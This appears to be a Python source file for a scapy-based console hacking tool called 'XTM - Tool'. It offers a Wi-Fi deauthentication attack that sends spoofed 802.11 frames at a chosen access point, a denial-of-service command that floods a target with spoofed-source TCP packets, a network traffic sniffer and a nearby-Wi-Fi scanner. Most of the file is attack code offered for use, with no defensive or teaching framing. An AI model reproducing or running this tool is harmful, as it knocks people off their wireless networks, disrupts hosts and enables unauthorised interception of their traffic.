from scapy.all import *
from scapy.all import Ether
import os,time,socket,random
from datetime import datetime
from colorama import *

#define colors
w = Fore.WHITE
r = Fore.RED
c = Fore.CYAN
y = Fore.YELLOW 
g = Fore.GREEN 
#
#define other things
now = datetime.now()
s_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #TCP
s_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
#

#define commands
commands = [
    "help",
    "deauthattack",
    "dos",
    "sniff",
    "wifisniffer"
]
#

def sniffing(pkt):
    now = datetime.now()
    w = Fore.WHITE
    r = Fore.RED
    c = Fore.CYAN
    y = Fore.YELLOW 
    g = Fore.GREEN 
    blacklist = open("blacklist.txt", "r")
    data = blacklist.read()
    blacklist.close()
    if (IP in pkt):
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        f = True
    else:
        f = False
    if (TCP in pkt):
        tcp_sport = pkt[TCP].sport
        tcp_dport = pkt[TCP].dport
    else:
        f = False
    if (f == True):
        m = True
        if (str(ip_dst) not in data and str(ip_src) not in data):
            print(Fore.WHITE + "[" + Fore.RED + " %s"%(now) + Fore.WHITE + " ] " + Fore.GREEN + " [+] %s:%s"%(str(ip_src),(tcp_sport)) + Fore.YELLOW + " --> " + Fore.GREEN + " %s:%s"%(str(ip_dst),(tcp_dport)))
            m = False
        if (str(ip_dst) in data and str(ip_src) in data):
            print(Fore.WHITE + "[" + Fore.RED + " %s"%(now) + Fore.WHITE + " ] " + Fore.CYAN + " [+] %s:%s"%(str(ip_src),(tcp_sport)) + Fore.YELLOW + " --> " + Fore.CYAN + " %s:%s"%(str(ip_dst),(tcp_dport)))
            m = False
        if (m == True):
            if (str(ip_src) in data):
                print(Fore.WHITE + "[" + Fore.RED + " %s"%(now) + Fore.WHITE + " ] " + Fore.CYAN + " [+] %s:%s"%(str(ip_src),(tcp_sport)) + Fore.YELLOW + " --> " + Fore.GREEN + " %s:%s"%(str(ip_dst),(tcp_dport)))
                m = False
            if (m == True):
                if (str(ip_dst) in data):
                    print(Fore.WHITE + "[" + Fore.RED + " %s"%(now) + Fore.WHITE + " ] " + Fore.GREEN + " [+] %s:%s"%(str(ip_src),(tcp_sport)) + Fore.YELLOW + " --> " + Fore.CYAN + " %s:%s"%(str(ip_dst),(tcp_dport)))
                    m = False
    time.sleep(0.9)

def commandif(userinput):
    now = datetime.now()
    w = Fore.WHITE
    r = Fore.RED
    c = Fore.CYAN
    y = Fore.YELLOW 
    g = Fore.GREEN 
    if (userinput in commands[0]):
        print(" ")
        print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " XTM HELP")
        print(" ")
        print(w + "< dos" + c + " --> " + w + " starts the XTM-DoS-Tool >")
        print(w + "< deauthattack" + c + " --> " + w + " uses the XTM-AP-Deauth-Attack >")
        print(w + "< sniff" + c + " --> " + w + " sniffs in your network >")
        print(w + "< help" + c + " --> " + w + " shows this screen >")
        print(w + "< wifisniffer" + c + " --> " + w + " sniffs for wifi in your area (default interface: wlan0mon)")
    if (userinput in commands[1]):
        print(" ")
        print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " XTM Deauth Attack")
        print(" ")
        src_mac = input(y + "Source_MAC" + c + ">>>" + r + " ")
        dst_bssid = input(y + "Destination_BSSID" + c + ">>>" + r + " ")
        counter = input(y + "Count" + c + ">>>" + r + " ")
        print(" ")
        print(" ")
        print(w + "[ " + r + "%s"%(now) + w + " ]" + g + " << + >>" + y + " Attacking " + r + "%s"%(str(dst_bssid)))
        bytes = random._urandom(55)
        pkt = (RadioTap()/Dot11(addr1=src_mac,addr2=dst_bssid,addr3=dst_bssid)/(bytes))
        try:
            sendp(pkt,iface="wlan0mon",count=int(counter))
            send = True
        except:
            print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " Failed to send message to BSSID!")
            send = False
        if (send == True):
            print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " Packages have been sent!")
    if (userinput in commands[2]):
        print(" ")
        print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " XTM DoS Attack")
        print(" ")
        src_ip = input(y + "Source_IP" + c + ">>>" + r + " ")
        src_mac = input(y + "Source_MAC" + c + ">>>" + r + " ")
        src_port = input(y + "Source_PORT" + c + ">>>" + r + " ")
        dst_ip = input(y + "Destination_IP" + c + ">>>" + r + " ")
        dst_port = input(y + "Destination_PORT" + c + ">>>" + r + " ")
        counter = input(y + "Count" + c + ">>>" + r + " ")
        print(" ")
        print(" ")
        print(w + "[ " + r + "%s"%(now) + w + " ]" + g + " << + >>" + y + " Attacking " + r + "%s"%(str(dst_ip)))
        bytes = random._urandom(600)
        pkt = (Ether(src=src_mac)/IP(src=src_ip,dst=dst_ip)/TCP(sport=int(src_port),dport=int(dst_port))/(bytes))
        try:
            sendp(pkt,count=int(counter))
            send = True
        except:
            print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " Failed to send message to Destination!")
            send = False
        if (send == True):
            print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " Packages have been sent!")
    
    if (userinput in commands[3]):
        print(" ")
        print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " XTM Sniffer")
        print(" ")
        src_ip = input(y + "Source_IP" + c + ">>>" + r + " ")
        counter = input(y + "Count" + c + ">>>" + r + " ")
        print(" ")
        print(" ")
        print(r + "----------------------------------------------------")
        print(" ")
        print(" ")
        print(w + "[ " + r + "%s"%(now) + w + " ]" + g + " << + >>" + y + " Sniffing.. ")
        print(" ")
        print(" ")
        file = open("blacklist.txt", "w")
        file.write("%s"%(src_ip))
        file.close()
        sniff(filter="ip",count=int(counter),prn=sniffing)
        sniff(filter="ip and host %s"%(src_ip),count=int(counter),prn=sniffing)
        sniff(filter="tcp",count=int(counter),prn=sniffing)
    if (userinput in commands[4]):
        now = datetime.now()
        ap_list = []

        def PacketHandler(pkt) :
            if (pkt.haslayer(Dot11)) :
                if (pkt.type == 0 and pkt.subtype == 8):
                    if (pkt.addr2 not in ap_list):
                        ap_list.append(pkt.addr2)
                        pktinfo = pkt.info
                        packet = pktinfo.decode()
                        print(w + "[" + r + " %s "%(now) + w + "]" + y + " AP MAC:" + c + " %s "%(pkt.addr2) + y + "with SSID:" + c + " %s "%(packet))
            else:
                print(w + "[" + r + " %s "%(now) + w + "]" + r + " Could not find any Wifi!")
        print(w + "[" + r + " %s "%(now) + w + "]" + g + " *" + y + " Searching for Wifi in your area..")
        print(" ")
        sniff(iface="wlan0mon",prn = PacketHandler)
        
    
            
        

def home():
    print(" ")
    print(" ")
    userinput = input(c + ">>>" + y +  " ")
    if (userinput == "exit()" or userinput == "exit"):
        quit()
    if (userinput not in commands):
        print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " This is not a command!")
        home()
    else:
        commandif(userinput)
    home()
    


##################
os.system("clear")
print(" ")
print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " XTM - Tool")
print(" ")
print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " Version: Linux")
print(" ")
print(w + "[ " + r + "%s"%(now) + w + " ]" + y + " Type 'help' for help")
home()
